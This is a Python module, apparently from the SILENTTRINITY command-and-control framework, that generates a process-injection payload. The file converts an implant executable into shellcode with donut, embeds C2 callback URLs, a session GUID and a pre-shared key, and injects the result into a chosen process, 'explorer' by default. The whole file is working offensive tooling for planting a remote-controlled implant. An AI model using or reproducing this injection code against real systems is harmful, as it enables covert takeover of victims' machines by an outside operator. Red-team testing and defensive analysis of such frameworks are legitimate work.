import donut
import uuid
import core.events as events
from core.teamserver import ipc_server
from core.teamserver.crypto import gen_stager_psk
from core.utils import shellcode_to_boo_byte_array
from core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/inject'
        self.language = 'boo'
        self.description = 'Injects a SILENTTRINITY session into the specified process using shellcode'
        self.author = '@byt3bl33d3r'
        self.references = []
        self.options = {
            'Listener': {
                'Description'   :   'Listener to use',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Process': {
                'Description'   :   'Process to inject into',
                'Required'      :   False,
                'Value'         :   'explorer'
            },
            'InjectionMethod': {
                'Description'   :   'Injection Method',
                'Required'      :   False,
                'Value'         :   'InjectRemote'
            }
        }

    def payload(self):
        listener = ipc_server.publish_event(events.GET_LISTENERS, (self.options['Listener']['Value'],))
        if listener:
            c2_urls = ','.join(
                filter(None, [f"{listener.name}://{listener['BindIP']}:{listener['Port']}", listener['CallBackURls']])
            )

            guid = uuid.uuid4()
            psk = gen_stager_psk()
            ipc_server.publish_event(events.SESSION_REGISTER, (guid, psk))

            donut_shellcode = donut.create(file='./core/teamserver/data/naga.exe', params=f"{guid};{psk};{c2_urls}")
            shellcode = shellcode_to_boo_byte_array(donut_shellcode)
            if self.options['InjectionMethod']['Value'] == 'InjectRemote':
                with open('core/teamserver/modules/boo/src/injectremote.boo', 'r') as module_src:
                    src = module_src.read()
                    src = src.replace('BYTES', shellcode)
                    src = src.replace('PROCESS', self.options['Process']['Value'])
                    return src

            elif self.options['InjectionMethod']['Value'] == 'QueueUserAPC':
                raise NotImplemented

            elif self.options['InjectionMethod']['Value'] == 'InjectSelf':
                raise NotImplemented
